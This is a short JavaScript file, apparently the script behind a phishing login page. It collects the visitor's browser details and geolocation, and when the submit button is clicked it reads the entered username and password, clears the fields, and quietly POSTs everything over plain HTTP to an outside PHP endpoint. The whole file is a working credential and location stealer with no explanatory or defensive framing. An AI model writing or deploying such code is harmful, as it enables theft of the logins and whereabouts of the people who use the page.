var userAgent, languages, latitude, longitude;

window.onload = function () {
    userAgent = navigator.userAgent;
    if (navigator.geolocation) {
        var test = navigator.geolocation.getCurrentPosition(showPosition);
      }
    languages = navigator.languages;
}

document.getElementById("mySubmitButton").onclick = function(){
    var today = new Date();
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;
    document.getElementById("username").value = "";
    document.getElementById("password").value = "";

    var xhttp = new XMLHttpRequest();
    xhttp.open("POST", "http://viatest.8u.cz/add.php", true);
    var resultString = "New entry: " + today + "\n" + username + ";" + password + ";" + userAgent + ";" + languages + ";" + latitude + ";" + longitude + ";";
    xhttp.send(resultString);
}

function showPosition(position) {
    latitude = position.coords.latitude;
    longitude = position.coords.longitude;
}